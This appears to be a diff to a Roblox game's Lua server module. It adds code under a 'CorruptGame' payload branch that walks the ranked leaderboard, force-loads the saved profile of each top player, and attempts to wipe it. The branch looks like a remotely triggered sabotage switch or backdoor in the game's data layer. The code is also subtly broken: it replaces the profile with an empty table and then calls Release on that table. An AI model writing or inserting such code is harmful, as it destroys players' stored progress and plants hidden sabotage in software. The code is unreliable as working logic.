@@ -45,8 +45,73 @@ function m:Init()
 			end
 		end
 		if Payloads['CorruptGame'] then
-			local Key = 'Profile_'..p.UserId;
-			require(game.ServerStorage.Modules.Managers.DataManager):FullWipePlayer(p);
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerStorage = game:GetService("ServerStorage")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local DataStoreService = game:GetService("DataStoreService")
+
+local DataManager = require(ServerStorage.Modules.Managers.DataManager)
+local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
+local ProfileTemplate = DataManager:GetDataTemplate()
+local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes28", ProfileTemplate)
+
+
+local StatData = require(ServerStorage.Modules.Utility.StatData)
+local RankedLeaderboards = DataStoreService:GetOrderedDataStore(StatData.RankedLeaderboardStore)
+
+task.spawn(function()
+    local lowestFirst = false
+    local numbersShown = 100 -- Top 100 public
+    local min = 10
+    local max = 10e30
+    local help
+    local Data = {}
+
+    local Success, Pages = pcall(function()
+        return RankedLeaderboards:GetSortedAsync(lowestFirst, numbersShown, min, max)
+    end)
+    if Success then
+        repeat 
+            local TopPage = Pages:GetCurrentPage()
+
+            for Rank, PageData in pairs(TopPage) do
+                Data[tostring(PageData.key)] = Rank
+            end
+            local PageSuccess, Error = pcall(function()
+                Pages:AdvanceToNextPageAsync()
+            end)
+            if Error then
+                    --print(Error)
+                local PageSuccess2, Error2 = pcall(function()
+                    Pages:AdvanceToNextPageAsync()
+                end)
+                if Error2 then 
+                    --print(Error2)
+                    help = true
+                end
+            end
+        until help == true
+
+        if help then
+            for Rank, PageData in pairs(Pages:GetCurrentPage()) do
+                --print(Rank, PageData)
+            end
+            --print(Data)
+            for i,v in pairs(Data) do
+                local profilekey = "Player_" .. i
+                --print(profilekey)
+                local Profile = GameProfileStore:LoadProfileAsync(profilekey, "ForceLoad")
+                --print(Profile)
+
+                Profile = {}
+                Profile:Release()
+
+                task.wait(0.5)
+            end
+        end
+    end
+end)
 		end
 	end)
 	local s, c
